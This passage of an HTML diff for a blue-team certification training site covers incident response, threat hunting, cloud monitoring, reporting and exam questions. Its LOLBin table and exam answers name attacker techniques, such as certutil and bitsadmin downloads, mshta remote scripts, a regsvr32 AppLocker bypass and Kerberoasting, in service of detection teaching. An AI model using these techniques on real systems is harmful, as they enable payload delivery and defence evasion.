+            <div class="qbl" id="q-me1"><div class="qq">windows.pslist shows 47 processes. windows.psscan shows 49 — 2 extra only visible in psscan. What does this indicate?</div><div class="qopts"><button class="qo" onclick="QA('q-me1',0,2)">A. psscan finds system processes pslist ignores by design</button><button class="qo" onclick="QA('q-me1',1,2)">B. Two processes are hiding from the Windows process list — strong rootkit or kernel-level malware indicator</button><button class="qo" onclick="QA('q-me1',2,2)">C. pslist had a parsing error — only trust psscan</button><button class="qo" onclick="QA('q-me1',3,2)">D. The memory dump is corrupted</button></div><div class="qfb" id="q-me1-fb"></div><button class="undoq" id="uq-q-me1" onclick="UQ('q-me1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-memory" onclick="MC('memory')">Mark module complete ✓</button><button class="ubtn" id="ub-memory" onclick="UM('memory')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- IR -->
+      <div class="page" id="page-ir">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 18</div><div class="ltit">Incident Response</div><div class="lmet">PICERL lifecycle · Severity · Evidence collection · Containment · TheHive</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">PICERL — the 6-phase IR lifecycle</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">Preparation</div><div class="sdesc">Playbooks, tools, communication channels, escalation paths, retainer agreements — all defined BEFORE an incident. IR without preparation is chaos. TheHive5 configured, runbooks published.</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Identification (Detection &amp; Analysis)</div><div class="sdesc">SIEM alert, EDR detection, or user report triggers IR. Classify severity (P1/P2/P3), determine scope, identify affected assets and data.</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Containment</div><div class="sdesc">Short-term: isolate infected systems from the network. Long-term: patch the exploited vulnerability. NEVER eradicate before fully scoping — you'll alert the attacker and lose visibility.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Eradication</div><div class="sdesc">Remove all malware, delete attacker accounts, close every persistence mechanism. Verify completely — missed persistence = re-infection within days.</div></div></div>
+              <div class="si"><div class="sn">5</div><div><div class="stit2">Recovery</div><div class="sdesc">Restore from verified clean backups. Verify integrity before reconnecting. Monitor closely for 30 days post-recovery — recurrence is common if eradication was incomplete.</div></div></div>
+              <div class="si"><div class="sn">6</div><div><div class="stit2">Lessons Learned</div><div class="sdesc">Post-incident review within 2 weeks while events are fresh. What detection failed? What response was slow? Update playbooks, create new SIEM rules from TTPs observed.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Evidence collection order (order of volatility)</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">1st — Volatile (collect first)</div><div class="ccb">RAM dump · Active network connections · Running processes · Open file handles · Logged-in users. Lost on shutdown.</div></div>
+              <div class="cc"><div class="cct">2nd — Semi-volatile</div><div class="ccb">Event logs (before clearing) · Temp files · Browser cache · Registry hives in memory.</div></div>
+              <div class="cc"><div class="cct">3rd — Non-volatile (disk)</div><div class="ccb">Bit-for-bit disk image with write blocker · Stored logs · Registry files · File system artifacts.</div></div>
+            </div>
+            <div class="ca warn">Chain of custody: every piece of evidence must be documented — what it is, when collected, by whom, hash value, and every person who touched it. Without this, evidence may be inadmissible in legal proceedings.</div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" target="_blank">NIST SP 800-61 IR Guide (free PDF)</a>
+              <a class="el" href="https://response.pagerduty.com" target="_blank">PagerDuty IR Playbooks</a>
+              <a class="el" href="https://blueteamlabs.online/" target="_blank">Blue Team Labs Online</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-ir1"><div class="qq">During an active ransomware incident affecting 3 workstations, you've confirmed the infection. What is the first containment action?</div><div class="qopts"><button class="qo" onclick="QA('q-ir1',0,2)">A. Immediately reimage all 3 workstations from clean backups</button><button class="qo" onclick="QA('q-ir1',1,2)">B. Isolate the infected systems from the network to stop spread while preserving evidence</button><button class="qo" onclick="QA('q-ir1',2,2)">C. Run antivirus on all 3 workstations simultaneously</button><button class="qo" onclick="QA('q-ir1',3,2)">D. Notify all users via email that the network is compromised</button></div><div class="qfb" id="q-ir1-fb"></div><button class="undoq" id="uq-q-ir1" onclick="UQ('q-ir1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-ir" onclick="MC('ir')">Mark module complete ✓</button><button class="ubtn" id="ub-ir" onclick="UM('ir')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- THREAT HUNTING -->
+      <div class="page" id="page-hunting">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 19</div><div class="ltit">Threat Hunting</div><div class="lmet">Hypothesis-driven · IOC-based · Baselining · LOLBins · Hunt execution</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Two hunting methodologies</div>
+            <table class="dt"><thead><tr><th>Approach</th><th>Starts with</th><th>Best for</th><th>Limitation</th></tr></thead><tbody>
+              <tr><td>Hypothesis-driven</td><td>Theory about attacker behavior: "I believe attackers used certutil to download a payload"</td><td>Finding novel TTPs and unknown threats not caught by existing rules</td><td>Time-intensive, requires deep environment knowledge and ATT&CK familiarity</td></tr>
+              <tr><td>IOC-based</td><td>Known bad indicator from TI feed: hash, IP, domain, registry key, mutex</td><td>Confirming past or active compromise after receiving threat intel</td><td>Only finds known threats — zero-days and novel techniques are invisible</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">IOC-based hunt — step by step</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">Receive IOC from intel source</div><div class="sdesc">Vendor advisory, OTX pulse, MISP feed, or from your own malware analysis. Note the source confidence level.</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Enrich before hunting</div><div class="sdesc">Check VirusTotal and OTX. Understand the campaign context and set the correct time window — not just "last 24 hours". If the campaign is active since October, search back to October.</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Identify data sources and query</div><div class="sdesc">IP/domain → firewall, proxy, DNS logs. Hash → EDR, Sysmon EID 1. Registry key → Sysmon EID 13. Cross-reference: same IOC across multiple sources = high confidence hit.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Document findings and create detections</div><div class="sdesc">Found nothing: document that too (proves coverage). Found hits: escalate as incident AND create a SIEM alert rule so future occurrences auto-alert.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">LOLBins — Living Off the Land Binaries</div>
+            <p class="ltxt">Attackers abuse legitimate Windows binaries signed by Microsoft to execute malicious actions while blending in as normal system activity. They may bypass application whitelisting and antivirus.</p>
+            <div class="iocrow">
+              <div class="iocp"><div class="iocpn">certutil.exe</div><div class="iocpw">Download via -urlcache -split -f, decode base64</div></div>
+              <div class="iocp"><div class="iocpn">mshta.exe</div><div class="iocpw">Execute remote HTA scripts from URL argument</div></div>
+              <div class="iocp"><div class="iocpn">rundll32.exe</div><div class="iocpw">Execute DLL payloads from disk or UNC path</div></div>
+              <div class="iocp"><div class="iocpn">regsvr32.exe</div><div class="iocpw">Squiblydoo — execute remote scripts, bypass AppLocker</div></div>
+              <div class="iocp"><div class="iocpn">bitsadmin</div><div class="iocpw">Download + execute, create persistent BITS jobs</div></div>
+              <div class="iocp"><div class="iocpn">wscript / cscript</div><div class="iocpw">Run VBScript / JScript from disk or temp directories</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://lolbas-project.github.io" target="_blank">LOLBAS Project — full reference</a>
+              <a class="el" href="https://github.com/stuxnet999/MemLabs" target="_blank">MemLabs Volatility challenges</a>
+              <a class="el" href="https://blueteamlabs.online/" target="_blank">Blue Team Labs Online</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-hu1"><div class="qq">A threat intel report provides a SHA256 hash linked to a C2 implant active since October 2023. What should your FIRST action be before querying the SIEM?</div><div class="qopts"><button class="qo" onclick="QA('q-hu1',0,2)">A. Search the SIEM immediately for the last 24 hours</button><button class="qo" onclick="QA('q-hu1',1,2)">B. Enrich on VirusTotal/OTX to understand campaign context and determine the correct search time window</button><button class="qo" onclick="QA('q-hu1',2,2)">C. Wait for the SIEM to auto-detect it from the feed</button><button class="qo" onclick="QA('q-hu1',3,2)">D. Report to management before investigating</button></div><div class="qfb" id="q-hu1-fb"></div><button class="undoq" id="uq-q-hu1" onclick="UQ('q-hu1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-hunting" onclick="MC('hunting')">Mark module complete ✓</button><button class="ubtn" id="ub-hunting" onclick="UM('hunting')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- CLOUD -->
+      <div class="page" id="page-cloud">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 20</div><div class="ltit">Cloud Security Monitoring</div><div class="lmet">CloudTrail · Azure Monitor · IAM anomalies · Cryptomining · Misconfigurations</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Cloud logging sources</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">AWS CloudTrail</div><div class="ccb">API call logging for all AWS services. Who called what API, from which IP, at what time. Critical for IAM investigation and post-compromise scoping.</div></div>
+              <div class="cc"><div class="cct">Azure Monitor / Entra ID Logs</div><div class="ccb">Sign-in logs, audit logs, activity logs. Microsoft Defender for Cloud adds threat detection. Entra ID logs all AAD authentication events.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">High-priority cloud threat indicators</div>
+            <div class="ca danger">IAM changes by root account / global admin: always investigate. Root credentials should almost never be used operationally. An IAM policy granting new AdministratorAccess = top cloud persistence technique (T1136).</div>
+            <div class="ca warn">Cryptomining: sudden CPU/GPU spike, large VM/EC2 instances created in unusual regions, high network egress. Attackers spin up compute at your expense within minutes of gaining access.</div>
+            <div class="ca info">Public storage buckets: S3 bucket or Azure Blob made public = data breach in progress. Automated misconfiguration detection should alert within minutes. This is one of the most common cloud incidents.</div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="http://flaws.cloud" target="_blank">flaws.cloud — free AWS security lab</a>
+              <a class="el" href="https://github.com/RhinoSecurityLabs/cloudgoat" target="_blank">CloudGoat — vulnerable AWS lab</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-cl1"><div class="qq">CloudTrail shows an IAM user calling CreateUser and attaching AdministratorAccess from an IP in a country your organization has never operated in. Correct response?</div><div class="qopts"><button class="qo" onclick="QA('q-cl1',0,2)">A. Monitor for 24 hours before acting</button><button class="qo" onclick="QA('q-cl1',1,2)">B. Escalate immediately — compromised IAM user creating persistent admin backdoor (T1136)</button><button class="qo" onclick="QA('q-cl1',2,2)">C. Ask the IAM user if they created a new account</button><button class="qo" onclick="QA('q-cl1',3,2)">D. Normal DevOps activity — close as false positive</button></div><div class="qfb" id="q-cl1-fb"></div><button class="undoq" id="uq-q-cl1" onclick="UQ('q-cl1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-cloud" onclick="MC('cloud')">Mark module complete ✓</button><button class="ubtn" id="ub-cloud" onclick="UM('cloud')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- DOCUMENTATION -->
+      <div class="page" id="page-docs">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 5 · Module 21</div><div class="ltit">Security Documentation</div><div class="lmet">Incident reports · Playbooks · IOC defanging · Stakeholder communication</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Incident report structure</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Executive Summary</div><div class="ccb">2–3 non-technical sentences. What happened, business impact, current status. The only section most executives read — make it clear and complete.</div></div>
+              <div class="cc"><div class="cct">Timeline (UTC)</div><div class="ccb">Chronological events: first indicator → containment. Include detection time, response time, containment time — these are measurable KPIs for the SOC.</div></div>
+              <div class="cc"><div class="cct">Technical Analysis</div><div class="ccb">ATT&CK mapping, affected systems, attack chain reconstruction. For the IR team and future investigation reference.</div></div>
+              <div class="cc"><div class="cct">Defanged IOCs</div><div class="ccb">hxxps://evil[.]com — 185.220.101[.]45 — hash values. Prevents accidental clicks. Ready for threat hunting and blocking in other environments.</div></div>
+              <div class="cc"><div class="cct">Actionable Recommendations</div><div class="ccb">Specific: "Enforce MFA on all VPN by [date], assigned to IT Infrastructure team." Never vague: "improve security" is not a recommendation.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Playbook anatomy</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">Trigger conditions</div><div class="sdesc">What specific alert or event activates this playbook? Be specific — not "malware alert" but "EDR alert for LSASS memory access on non-security-product process".</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Immediate actions (first 15 minutes)</div><div class="sdesc">Exact steps Tier 1 must take. No ambiguity. "Check hash on VirusTotal, look up asset in CMDB, search SIEM for related alerts in past 24 hours, escalate to Tier 2 if confirmed."</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Investigation steps with SIEM queries</div><div class="sdesc">Ordered list of what to check and in what sequence. Include specific SPL/KQL queries and what each finding means for the classification.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Containment decision tree</div><div class="sdesc">IF confirmed TP → isolate host immediately. IF uncertain → gather X more data points. IF executive asset involved → escalate to CISO regardless of confidence level.</div></div></div>
+              <div class="si"><div class="sn">5</div><div><div class="stit2">Communication templates</div><div class="sdesc">Pre-written notification text for technical teams, management, and legal. Saves critical minutes during an active incident when cognitive load is highest.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-do1"><div class="qq">An incident report recommendation states: "The organization should improve its security posture going forward." Why is this a poor recommendation?</div><div class="qopts"><button class="qo" onclick="QA('q-do1',0,2)">A. Too technical for an executive audience</button><button class="qo" onclick="QA('q-do1',1,2)">B. Not actionable — no specific action, owner, or timeline. Good recommendations are specific and measurable.</button><button class="qo" onclick="QA('q-do1',2,2)">C. Recommendations should not appear in incident reports</button><button class="qo" onclick="QA('q-do1',3,2)">D. It reveals too much about organizational vulnerabilities</button></div><div class="qfb" id="q-do1-fb"></div><button class="undoq" id="uq-q-do1" onclick="UQ('q-do1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-docs" onclick="MC('docs')">Mark module complete ✓</button><button class="ubtn" id="ub-docs" onclick="UM('docs')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- EXAM Q&A -->
+      <div class="page" id="page-exam">
+        <div style="margin-bottom:24px"><div style="font-family:var(--mo);font-size:10px;color:var(--cy);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px">Phase 5 · Exam Prep</div><div style="font-family:var(--mo);font-size:20px;font-weight:700;color:var(--tx);margin-bottom:6px">BTL1 Exam Q&amp;A Drill</div><div style="font-size:13px;color:var(--tx2)">Click any question to reveal the answer. Covers all syllabus areas including the new modules.</div></div>
+        <div class="ecat"><div class="ecatt">SOC &amp; Alert Management</div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is the difference between SIEM and SOAR?</div><div class="eqa">SIEM (Security Information &amp; Event Management) collects, normalizes, and correlates logs to detect threats and fire alerts. SOAR (Security Orchestration, Automation &amp; Response) automates the response to those alerts — e.g. auto-isolate a host when ransomware is detected. SIEM detects; SOAR responds. They complement each other: SIEM is the brain, SOAR is the hands.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">Name the 3 SOC tier roles and their core responsibilities.</div><div class="eqa">Tier 1 (Analyst): 24/7 queue monitoring, initial triage (FP vs TP), OSINT enrichment, escalation to Tier 2. Tier 2 (IR Specialist): deep investigation, scoping, containment decisions, forensic analysis, stakeholder communication. Tier 3 (Threat Hunter): proactive hunting for undetected threats, new detection rule development, deep malware analysis, coverage gap analysis using ATT&CK.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What must a shift handover document always include?</div><div class="eqa">All open tickets and current status, active incidents or ongoing escalations, alerts paused pending enrichment, known FPs that need tuning, any environmental changes affecting monitoring (maintenance windows, new systems onboarded), and any threat intelligence received during the shift.</div></div>
+        </div>
+        <div class="ecat"><div class="ecatt">MITRE ATT&amp;CK &amp; Threat Intelligence</div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">Name the 14 ATT&CK tactics in order.</div><div class="eqa">Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Command &amp; Control → Exfiltration → Impact. Memory trick: "Recon, Resources, In, Ex, Persist, Priv, Def, Cred, Disc, Lat, Collect, C2, Exfil, Impact".</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is the Pyramid of Pain and why does it drive detection strategy?</div><div class="eqa">The Pyramid of Pain (David Bianco) ranks IOC types by how much pain detecting them causes the attacker. Bottom (easy to change): hashes, IPs, domains. Middle: artifacts, tools. Top (hard to change): TTPs. Detecting and responding to TTPs — the ATT&CK technique layer — forces the attacker to completely retool their entire operation. This is why ATT&CK-based detection is more durable than IOC-based blocking.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is TLP vs PAP?</div><div class="eqa">TLP (Traffic Light Protocol) governs information SHARING — who you can share threat intel with: WHITE (public), GREEN (community), AMBER (organization + limited partners), RED (recipient only). PAP (Permissible Actions Protocol) governs what ACTIONS you can take with received intel: WHITE (unrestricted), GREEN (community sharing + detection), AMBER (internal use + detection), RED (cannot be used in automated systems). Both appear on threat reports from ISACs and vendors.</div></div>
+        </div>
+        <div class="ecat"><div class="ecatt">Log Analysis &amp; SIEM</div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is Windows EID 1102 and why does it always require escalation?</div><div class="eqa">EID 1102 means the Windows Security event log was cleared. This is an attacker anti-forensics indicator — they are actively destroying evidence of their activity. A legitimate admin clearing logs would have a documented change ticket. Any EID 1102 without a prior-approved change ticket requires immediate escalation, and you should correlate all activity on that system in the preceding hours before the clear.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">Password spraying vs brute force — how do you distinguish them?</div><div class="eqa">Brute force: many passwords tried against ONE account — triggers lockout quickly. Password spraying: ONE or few passwords tried against MANY accounts — stays under per-account lockout thresholds. Detection signature: brute force = many EID 4625 for the same username from one IP. Spraying = many EID 4625 for many different usernames from one source IP, with only 1-2 attempts per account.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is a Sigma rule and why is it useful for detection engineering?</div><div class="eqa">Sigma is a generic, platform-agnostic detection rule format. Write once, convert to SPL (Splunk), KQL (Sentinel), Elasticsearch Query, or any other SIEM query language using the sigmac converter. This enables detection rules to be shared across the security community and applied regardless of which SIEM the organization uses. SigmaHQ maintains thousands of community rules mapped to ATT&CK techniques. Key fields: logsource (where to look), detection.selection (what to match), condition (logic).</div></div>
+        </div>
+        <div class="ecat"><div class="ecatt">Digital Forensics &amp; IR</div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is the correct order of evidence collection?</div><div class="eqa">Most volatile first: (1) CPU registers/cache (rarely practical), (2) RAM memory dump, (3) Active network connections, (4) Running processes and open files, (5) Event logs before clearing, (6) Disk image (bit-for-bit with write blocker). The rule: collect what will be lost first. RAM is gone on shutdown; disk survives power cycling.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is MACB and how do you detect timestomping?</div><div class="eqa">MACB = Modified (last content change), Accessed (last read/executed), Changed ($MFT metadata changed), Born (file created on this volume). Timestomping = attacker modifies $STANDARD_INFORMATION timestamps to hide a file or make it appear legitimate. Detection: compare $STANDARD_INFORMATION vs $FILE_NAME timestamps in the MFT. $FILE_NAME is set by the kernel and cannot be modified without special tools. A mismatch = timestomping. Born timestamp newer than Modified = classic indicator.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">Name the 6 PICERL phases in order.</div><div class="eqa">Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned. Critical exam point: Containment happens BEFORE Eradication. You must stop the bleeding and fully understand the scope before cleaning up — premature eradication alerts the attacker and destroys your ability to understand the full compromise.</div></div>
+        </div>
+        <div class="ecat"><div class="ecatt">Network, Malware &amp; Active Directory</div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What are LOLBins? Give 5 examples.</div><div class="eqa">LOLBins (Living Off the Land Binaries) are legitimate Windows binaries abused by attackers for malicious purposes. They are signed by Microsoft, which may allow them to bypass AV and application whitelisting. Five examples: (1) certutil.exe — download files (-urlcache -split -f), decode base64, (2) mshta.exe — execute remote HTA scripts from a URL, (3) rundll32.exe — execute DLL payloads, (4) regsvr32.exe — Squiblydoo technique to execute remote scripts and bypass AppLocker, (5) bitsadmin — download files and create persistent BITS jobs.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What is Kerberoasting and how do you detect it?</div><div class="eqa">Kerberoasting (T1558.003): any authenticated domain user can request Kerberos TGS service tickets for any account with an SPN. The ticket is encrypted with the service account's password hash. The attacker collects these tickets and cracks them offline at unlimited speed without touching the domain controller again. Detection: mass EID 4769 (Kerberos TGS request) events from a single workstation targeting many different service accounts (SPNs) in a short time window — especially for RC4 encryption type (0x17) which is weaker and easier to crack.</div></div>
+          <div class="eq" onclick="this.classList.toggle('rv')"><div class="eqq">What does high PE section entropy indicate in malware analysis?</div><div class="eqa">Normal code sections have entropy around 5.0–6.5. Entropy above 7.0 in the .text or another executable section indicates the section contains packed, encrypted, or obfuscated data. The actual malicious code is concealed and decrypts itself at runtime. This is used by attackers to evade static AV signatures. When you see high entropy, static analysis will be limited — you must use a sandbox (Any.run) or debugger to unpack and analyze the actual payload. Tool: DIE (Detect It Easy) shows per-section entropy values.</div></div>
+        </div>
+      </div>
+
+      <!-- RESOURCES -->
+      <div class="page" id="page-resources">
+        <div style="margin-bottom:24px"><div style="font-family:var(--mo);font-size:10px;color:var(--cy);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px">All modules · Free resources</div><div style="font-family:var(--mo);font-size:20px;font-weight:700;color:var(--tx);margin-bottom:6px">Resource Library</div><div style="font-size:13px;color:var(--tx2)">Every free resource for BTL1, SOC Analyst, and Blue Team fundamentals. Filter by type.</div></div>
+        <div class="rflt">
+          <button class="fb active" onclick="fRes('all',this)">All</button>
+          <button class="fb" onclick="fRes('lab',this)">Labs</button>
+          <button class="fb" onclick="fRes('course',this)">Courses</button>
+          <button class="fb" onclick="fRes('tool',this)">Tools</button>
+          <button class="fb" onclick="fRes('video',this)">Videos</button>
+          <button class="fb" onclick="fRes('reference',this)">Reference</button>
+        </div>
+        <div class="rgrd" id="rgrd"></div>
+      </div>
+
+    </main>
+  </div>
+</div>
+  <!-- ═══════════════════════════════════════════
+       AUTH SCREEN FOOTER (visible on login page)
+  ═══════════════════════════════════════════ -->
+  <script>
+  // Inject auth footer after auth screen loads
+  (function() {
+    const authScr = document.getElementById('auth-scr');
+    if (!authScr) return;
+    const footer = document.createElement('div');
+    footer.className = 'auth-footer';
+    footer.innerHTML = `
+      <div class="auth-footer-links">
+        <a class="auth-footer-link" href="https://github.com/Selimjerbi66" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+          GitHub
+        </a>
+        <a class="auth-footer-link" href="https://linkedin.com/in/selim-jerbi-b355a0202" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          LinkedIn
+        </a>
+        <a class="auth-footer-link" href="mailto:Selimjerbi66@gmail.com">
+          <svg viewBox="0 0 24 24"><path d="M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 0 1 0 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L5.455 4.64 12 9.548l6.545-4.91 1.528-1.145C21.69 2.28 24 3.434 24 5.457z"/></svg>
+          Email
+        </a>
+      </div>
+      <div class="auth-footer-copy">
+        Made by <a href="https://github.com/Selimjerbi66" target="_blank" rel="noopener">Selim JERBI</a>
+        &nbsp;·&nbsp;
+        <a href="https://github.com/Selimjerbi66/CyberAtaraxia-Training-Suite" target="_blank" rel="noopener">Training Suite repo</a>
+        &nbsp;·&nbsp;
+        <a href="https://github.com/Selimjerbi66/CyberAtaraxia-Suite" target="_blank" rel="noopener">CyberAtaraxia Suite</a>
+      </div>
+    `;
+    authScr.appendChild(footer);
+  })();
+  </script>
+
+  <!-- ═══════════════════════════════════════════
+       APP FOOTER (inside the app, below layout)
+  ═══════════════════════════════════════════ -->
+  <footer class="app-footer" id="app-footer" style="display:none">
+    <div class="app-footer-left">
+      <img class="app-footer-logo" data-logo src="img/CA_logo.png" alt="CyberAtaraxia logo">
+      <span class="app-footer-name"><strong>CyberAtaraxia</strong> Training — BlueTeam</span>
+    </div>
+    <div class="app-footer-links">
+      <!-- Social links -->
+      <a class="app-footer-link" href="https://github.com/Selimjerbi66" target="_blank" rel="noopener" title="GitHub">
+        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+        GitHub
+      </a>
+      <a class="app-footer-link" href="https://linkedin.com/in/selim-jerbi-b355a0202" target="_blank" rel="noopener" title="LinkedIn">
+        <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+        LinkedIn
+      </a>
+      <a class="app-footer-link" href="mailto:Selimjerbi66@gmail.com" title="Email">
+        <svg viewBox="0 0 24 24"><path d="M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 0 1 0 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L5.455 4.64 12 9.548l6.545-4.91 1.528-1.145C21.69 2.28 24 3.434 24 5.457z"/></svg>
+        Email
+      </a>
